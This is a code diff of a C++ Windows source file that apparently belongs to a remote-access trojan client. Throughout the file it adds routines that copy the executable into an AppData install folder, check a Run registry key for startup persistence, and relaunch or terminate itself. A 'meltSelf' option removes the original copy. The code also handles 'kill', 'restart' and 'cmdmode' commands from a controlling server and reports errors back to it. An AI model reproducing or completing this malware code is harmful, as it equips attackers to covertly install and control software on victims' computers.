@@ -1,7 +1,11 @@
-#include "general.h"
+#include "includes.h"
 
-
-
+std::string General::currentPath;			//current path of executable
+std::string General::installFolder;		//path of folder it should be installed to
+std::string General::installPath;			//full path where executable should be installed to
+bool General::installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
+									//instead of proceeding to the main loop)
+LPTSTR General::lpArguments;
 
 bool General::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
 {
@@ -68,6 +72,8 @@ bool General::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
 }
 
 
+
+
 bool General::directoryExists(const char* dirName)			//checks if directory exists
 {
 	DWORD attribs = ::GetFileAttributesA(dirName);
@@ -76,31 +82,6 @@ bool General::directoryExists(const char* dirName)			//checks if directory exist
 	return true;			//original code : return (attribs & FILE_ATTRIBUTE_DIRECTORY); [CHANGED BC WARNING]
 }
 
-void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
-{
-	// additional information
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-
-	// set the size of the structures
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
-	// start the program up
-	CreateProcess(lpApplicationName,   // the path
-		lpArguments,        // Command line
-		NULL,           // Process handle not inheritable
-		NULL,           // Thread handle not inheritable
-		FALSE,          // Set handle inheritance to FALSE
-		0,              // No creation flags
-		NULL,           // Use parent's environment block
-		NULL,           // Use parent's starting directory 
-		&si,            // Pointer to STARTUPINFO structure
-		&pi);           // Pointer to PROCESS_INFORMATION structure
-						// Close process and thread handles. 
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
-}
 
 std::string General::getInstallFolder()		//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
 {
@@ -137,41 +118,91 @@ std::string General::getCurrentPath()		//gets current path of executable
 }
 
 
+
+bool General::locationSet()		//checks if executable is located in install position
+{
+	if (General::currentPath == General::installPath)
+		return true;
+	else
+		return false;
+}
+
+bool General::startupSet()		//checks if executable is starting on boot
+{
+	if (General::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
+		return true;
+	else
+		return false;
+}
+
+bool General::installed()		//checks if executable is installed properly (location + startup)
+{
+	if (startupSet() && locationSet())
+		return true;
+	else
+		return false;
+}
+
+
+
+void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
+{
+	// additional information
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	// set the size of the structures
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	// start the program up
+	CreateProcess(lpApplicationName,   // the path
+		lpArguments,        // Command line
+		NULL,           // Process handle not inheritable
+		NULL,           // Thread handle not inheritable
+		FALSE,          // Set handle inheritance to FALSE
+		0,              // No creation flags
+		NULL,           // Use parent's environment block
+		NULL,           // Use parent's starting directory 
+		&si,            // Pointer to STARTUPINFO structure
+		&pi);           // Pointer to PROCESS_INFORMATION structure
+						// Close process and thread handles. 
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+}
+
 void General::handleError(int errType, bool errSevere)	//handles errors
 {
 	if (errSevere)
 	{
-			//restart client
+		restartSelf();
 	}
 	else
 	{
 		switch (errType)
 		{
 		case 1:		//general error
-			sendError("General error");
+			Client::clientptr->sendError("General error");
 		case 2:		//cmd error		
-			sendError("CMD error");
+			Client::clientptr->sendError("CMD error");
 		case 3:		//networking error
-			sendError("Networking error");
+			Client::clientptr->sendError("Networking error");
 		}
+		
 	}
 
 }
 
-void General::sendError(std::string errorMessage)	//send error message to server
-{
-	MessageBox(NULL, errorMessage.c_str(), "sendError replacement", NULL);
-}
 
 void General::processCommand(std::string command)
 {
 	if (command == "kill")
 	{
-
+		killSelf();
 	}
 	else if (command == "restart")
 	{
-
+		restartSelf();
 	}
 	else if (command == "cmdmode")
 	{
@@ -187,10 +218,52 @@ void General::processCommand(std::string command)
 		{
 			CMD::cmdptr->writeCMD("exit");
 			CMD::cmdOpen = false;
+			
 		}
 	}
 	else
 	{
-		sendError("Command '" + command + "' was not recognized.");
+		Client::clientptr->sendError("Command '" + command + "' was not recognized.");
 	}
+}
+
+void General::restartSelf()
+{
+	Client::clientptr->sendError("Restart requested: Restarting self");
+	startProcess(currentPath.c_str(), NULL);
+	killSelf();
+}
+
+void General::killSelf()
+{
+	Client::clientptr->sendError("Termination requested: Killing self");
+	Client::clientptr->CloseConnection();
+	exit(0);
+}
+
+void General::log(std::string message)
+{
+
+}
+
+
+void General::setLocation()			//sets location(copies file)
+{
+	if (!General::directoryExists(General::installFolder.c_str()))
+		if (!CreateDirectory(General::installFolder.c_str(), NULL))	//tries to create folder		
+		{
+			//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
+		}
+	CopyFile(General::currentPath.c_str(), General::installPath.c_str(), 0);
+}
+
+
+void General::runInstalled()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
+{
+	if (General::installing)
+		if (!Settings::startOnNextBoot)
+		{
+			General::startProcess(General::installPath.c_str(), Settings::meltSelf ? convStringToLPTSTR("t " + General::currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
+		}
+
 }
